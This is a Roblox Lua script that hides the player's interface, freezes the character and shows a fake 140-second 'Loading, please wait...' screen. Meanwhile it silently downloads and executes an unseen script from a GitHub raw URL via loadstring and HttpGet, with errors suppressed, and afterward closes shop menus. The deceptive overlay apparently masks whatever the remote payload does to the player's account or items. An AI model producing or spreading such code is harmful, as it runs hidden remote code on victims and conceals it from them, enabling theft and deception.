local player = game.Players.LocalPlayer
local countdownTime = 140
local uis = game:GetService("UserInputService")

-- === STEP 1: Block movement + UI ===
for _, gui in pairs(player:WaitForChild("PlayerGui"):GetChildren()) do
    if gui:IsA("ScreenGui") then
        gui.Enabled = false
    end
end

local function freezeCharacter()
    local char = player.Character or player.CharacterAdded:Wait()
    if char:FindFirstChildOfClass("Humanoid") then
        local humanoid = char:FindFirstChildOfClass("Humanoid")
        humanoid.WalkSpeed = 0
        humanoid.JumpPower = 0
        humanoid.PlatformStand = true
    end
end

local cam = workspace.CurrentCamera
cam.CameraType = Enum.CameraType.Scriptable

-- === STEP 2: Create fullscreen loading GUI ===
local loadingGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
loadingGui.Name = "FullLoadingScreen"
loadingGui.IgnoreGuiInset = true
loadingGui.ResetOnSpawn = false
loadingGui.DisplayOrder = 9999

local bg = Instance.new("Frame", loadingGui)
bg.BackgroundColor3 = Color3.new(0, 0, 0)
bg.Size = UDim2.new(1, 0, 1, 0)

local title = Instance.new("TextLabel", bg)
title.Size = UDim2.new(1, 0, 0.1, 0)
title.Position = UDim2.new(0, 0, 0.3, 0)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.new(1, 1, 1)
title.TextScaled = true
title.Font = Enum.Font.SourceSansBold
title.Text = "Loading, please wait..."

local label = Instance.new("TextLabel", bg)
label.Size = UDim2.new(1, 0, 0.1, 0)
label.Position = UDim2.new(0, 0, 0.5, 0)
label.BackgroundTransparency = 1
label.TextColor3 = Color3.new(1, 1, 1)
label.TextScaled = true
label.Font = Enum.Font.SourceSans
label.Text = "Loading: " .. countdownTime

-- === STEP 3: Load your GitHub script silently ===
spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/boomboxmisscal/test/refs/heads/main/test"))()
    end)
end)

-- === STEP 4: Run countdown ===
freezeCharacter()

for i = countdownTime, 1, -1 do
    label.Text = "Loading: " .. i
    wait(1)
end

-- === STEP 5: Restore everything and close shop GUI ===
loadingGui:Destroy()

local playerGui = player:WaitForChild("PlayerGui")
for _, gui in pairs(playerGui:GetChildren()) do
    if gui:IsA("ScreenGui") and gui.Name:lower():find("shop") then
        gui.Enabled = false
    end
end

local char = player.Character or player.CharacterAdded:Wait()
local humanoid = char:FindFirstChildOfClass("Humanoid")
if humanoid then
    humanoid.WalkSpeed = 16
    humanoid.JumpPower = 50
    humanoid.PlatformStand = false
end

cam.CameraType = Enum.CameraType.Custom

for _, gui in pairs(playerGui:GetChildren()) do
    if gui:IsA("ScreenGui") then
        gui.Enabled = true
    end
end
